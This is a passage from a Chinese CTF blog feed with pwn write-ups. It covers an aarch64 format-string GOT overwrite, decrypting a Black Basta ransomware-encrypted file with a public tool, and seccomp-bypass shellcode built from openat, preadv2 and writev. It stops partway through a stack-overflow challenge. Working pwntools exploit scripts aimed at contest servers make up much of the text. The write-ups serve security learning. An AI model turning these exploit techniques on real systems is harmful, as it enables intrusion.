punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v6<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"$"</span> <span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试出偏移是<code>14</code>，开了<code>canary</code>保护，所以可以将<code>__stack_chk_fail_got</code>改成<code>backdoor</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> qemu-aarch64 <span class="token parameter variable">-L</span> ./libc/libc/lib ./pwn        aaaaaaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%paaaaaaaa-0x7f3e313a1400-0x2d70252d70252d70-0xa7025-0x7f3e313a1448-<span class="token punctuation">(</span>nil<span class="token punctuation">)</span>-0x8080808080-0x2c6f242c6f242c6f-0x7f3e313a13e0-0x7f3e30a48a00-0x400888-0x4008c0-0x7f3e313a13e0-0x4b30a489ac-0x6161616161616161-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'aarch64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'120.79.91.95'</span><span class="token punctuation">,</span> <span class="token number">3332</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-aarch64"</span><span class="token punctuation">,</span> <span class="token string">"-g"</span><span class="token punctuation">,</span> <span class="token string">"1234"</span><span class="token punctuation">,</span> <span class="token string">"./pwn"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>p <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">0x411018</span><span class="token punctuation">:</span><span class="token number">0x400770</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> write_size<span class="token operator">=</span><span class="token string">'short'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;题目下载地址：&lt;a href=&quot;https://github.com/0xviol1t/CTF-challenges/tree/main/2024/WKCTF&quot;&gt;https://github.com/0xviol1t/CTF-challenges/tree/main/202</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="heap" scheme="https://starrysky1004.github.io/tags/heap/"/>
    
    <category term="aarch64" scheme="https://starrysky1004.github.io/tags/aarch64/"/>
    
  </entry>
  
  <entry>
    <title>2024春秋杯夏季赛</title>
    <link href="https://starrysky1004.github.io/2024/07/14/2024-chun-qiu-bei-xia-ji-sai/2024-chun-qiu-bei-xia-ji-sai/"/>
    <id>https://starrysky1004.github.io/2024/07/14/2024-chun-qiu-bei-xia-ji-sai/2024-chun-qiu-bei-xia-ji-sai/</id>
    <published>2024-07-14T00:18:02.000Z</published>
    <updated>2024-07-14T00:23:47.395Z</updated>
    
    <content type="html"><![CDATA[<p>比赛打一半去学逆向啦， <code>awdp</code>的<code>pwn</code>没打</p><h3 id="初探勒索病毒"><a href="#初探勒索病毒" class="headerlink" title="初探勒索病毒"></a>初探勒索病毒</h3><pre class="line-numbers language-none"><code class="language-none">题目内容：你服务器上的一张图片被Black Basta勒索病毒给加密了。当你在服务器上还原出该图片后，等待一分钟左右，&#x2F;flag就会变为可读权限。（本题下发后会有一个ssh地址、账号密码，选手可通过ssh来访问环境）（关注微信公众号“勒索病毒头条”，发送关键词“BASTA”可获取该题提示。）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>我选择直接获取提示</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">【2024春秋杯夏季赛】https://www.nomoreransom.org/zh/decryption-tools.html搜索BlackBasta，并点击下载。（如果您还需要进一步的提示，可在本公众号输入“BASTA2”获取。）【2024春秋杯夏季赛】<span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/flags/"flags"/'</span> ./decryptblocks.py<span class="token builtin class-name">export</span> <span class="token assign-left variable">SRL_IGNORE_MAGIC</span><span class="token operator">=</span><span class="token number">1</span>./decryptblocks.py ./banana.jpg.sah28vut5 ./key.block<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题的判断依据是能不能正常访问<code>banana.jpg</code>这个图片，所以把<code>banana.jpg.sah28vut5</code>改成<code>banana.jpg</code>再用上面给的指令解密，图片在<code>/var/www/html</code>目录下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> ./banana.jpg.sah28vut5 ./banana.jpg<span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/flags/"flags"/'</span> ./decryptblocks.py<span class="token builtin class-name">export</span> <span class="token assign-left variable">SRL_IGNORE_MAGIC</span><span class="token operator">=</span><span class="token number">1</span>./decryptblocks.py ./banana.jpg ./key.block<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Shuffled-Execution"><a href="#Shuffled-Execution" class="headerlink" title="Shuffled_Execution"></a>Shuffled_Execution</h3><pre class="line-numbers language-none"><code class="language-none">题目内容：The Fishmonger found a secured entrance to somewhere...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>一道写<code>shellcode</code>的题，创建了一段可读可写可执行区域，写入<code>0x250</code>的数据后开了沙箱并对输入内容进行随机化操作，但是操作长度的判断是通过<code>strlen</code>获取的，所以直接输入<code>\x00</code>即可绕过</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token class-name">size_t</span> len<span class="token punctuation">;</span> <span class="token comment">// rsi</span>  __int64 v4<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-18h]</span>  <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  s <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">mmap</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x1337000</span><span class="token punctuation">,</span> <span class="token number">0x1000uLL</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> s <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1LL</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"mmap failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">syscall</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0x1337000LL</span><span class="token punctuation">,</span> <span class="token number">0x250LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">shuffle</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>s<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> len <span class="token operator">&lt;=</span> <span class="token number">0xAF</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">entrance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">LODWORD</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"Error triggered..."</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> v4<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>·<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看沙箱内容，发现禁用了<code>execve execveat open read readv pread preadv write sendmsg</code>，最后选择用<code>openat preadv2 writev</code>，需要注意的是<code>preadv2 writev</code>的用法</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h]</span>  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">seccomp_init</span><span class="token punctuation">(</span><span class="token number">2147418112LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">59LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">322LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">19LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">17LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">295LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">40LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_load</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> v2 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>示例如下，即<code>preadv2</code>的二参是一个结构体，且这个结构体包含了数据缓冲区地址以及长度，就相当于原来<code>read</code>的二参和三参</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/syscall.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/uio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SYS_preadv2</span> <span class="token expression"><span class="token number">327</span></span></span><span class="token class-name">ssize_t</span> <span class="token function">preadv2</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">iovec</span> <span class="token operator">*</span>iov<span class="token punctuation">,</span> <span class="token keyword">int</span> iovcnt<span class="token punctuation">,</span> <span class="token class-name">off_t</span> offset<span class="token punctuation">,</span> <span class="token keyword">int</span> flags<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">syscall</span><span class="token punctuation">(</span>SYS_preadv2<span class="token punctuation">,</span> fd<span class="token punctuation">,</span> iov<span class="token punctuation">,</span> iovcnt<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 打开文件</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 准备读取数据的缓冲区</span>    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">0x50</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token comment">// 设置读取操作的 iovec 结构体</span>    <span class="token keyword">struct</span> <span class="token class-name">iovec</span> iov<span class="token punctuation">;</span>    iov<span class="token punctuation">.</span>iov_base <span class="token operator">=</span> buffer<span class="token punctuation">;</span>    iov<span class="token punctuation">.</span>iov_len <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 使用 preadv2 读取文件数据到缓冲区</span>    <span class="token class-name">ssize_t</span> bytes_read <span class="token operator">=</span> <span class="token function">preadv2</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>iov<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>bytes_read <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"preadv2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 输出读取的数据</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> bytes_read<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 关闭文件</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终<code>exp</code>如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'8.147.128.163'</span><span class="token punctuation">,</span> <span class="token number">36703</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'\x00PP'</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''/* openat(fd=-0x64, file='flag', oflag=0) */        add rax, 0x62        mov r12, rax        mov rsi, rax        mov rdi, -0x64        /* call openat() */        mov rax, 0x101 /* 0x101 */        syscall        /* preadv2(vararg_0=3, vararg_1=0x1337090, vararg_2=1, vararg_3=0, vararg_4=0) */        mov rdi, 3        mov rdx, 0x1        add r12, 0x15        mov rsi, r12        /* call preadv2() */        mov rax, 327        syscall        /* writev(fd=1, iovec=0x1337090, count=1) */        mov rdi, 1        mov rdx, 0x1        /* call writev() */        mov rax, 0x14        syscall'''</span><span class="token punctuation">)</span>p <span class="token operator">+=</span> shellcode <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> <span class="token string">b'flag\x00'</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1337090</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'entrance'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="stdout"><a href="#stdout" class="headerlink" title="stdout"></a>stdout</h3><p>先检查保护</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Arch:     amd64-64-little   RELRO:    Partial RELRO   Stack:    No canary found   NX:       NX enabled   PIE:      No PIE (0x3ff000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>main</code>函数里存在栈溢出，溢出长度刚好是一个地址</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-50h] BYREF</span>  <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"where is my stdout???"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x60uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重点是<code>init</code>函数，输出被设置为全缓冲区，只有当缓冲区被填满时才会进行I&#x2F;O操作</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以通过以下方式进行手动刷新缓冲区从而输出缓冲区中的内容：</p><ul><li>显式调用<code>fflush</code>函数</li><li>流被关闭（调用<code>fclose</code>）</li><li>程序正常结束（调用<code>exit</code>）</li></ul><p>程序其他部分包括<code>vuln extend</code>，<code>vuln</code>目的是进行更大长度的栈溢出，而<code>extend</code>是为了向输出缓冲区填入更多内容加快填满输出缓冲区，因为直接通过输出一个地址来填满输出缓冲区会由于连接不稳定而无法打通远程</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token 